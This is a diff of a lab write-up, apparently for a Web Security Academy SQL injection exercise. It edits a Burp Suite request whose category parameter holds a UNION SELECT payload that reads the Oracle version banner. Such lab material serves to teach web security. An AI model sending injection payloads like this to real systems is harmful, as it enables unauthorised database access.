@@ -28,9 +28,7 @@ The category parameter is concatenated directly into an active SQL query. To ext
 ### Burp Suite Repeater Request
 
 ```http
-GET /filter?category=Clothing%2c+shoes+and+accessories'+UNION+SELECT+banner,+'def'+FROM+v$version-- HTTP/2
-Host: YOUR-LAB-ID.web-security-academy.net
-Cookie: session=YOUR_SESSION_COOKIE
+GET /filter?category=Clothing%2c+shoes+and+accessories'+UNION+SELECT+banner,+'def'+FROM+v$version-- HTTP/2
 
 ```
 
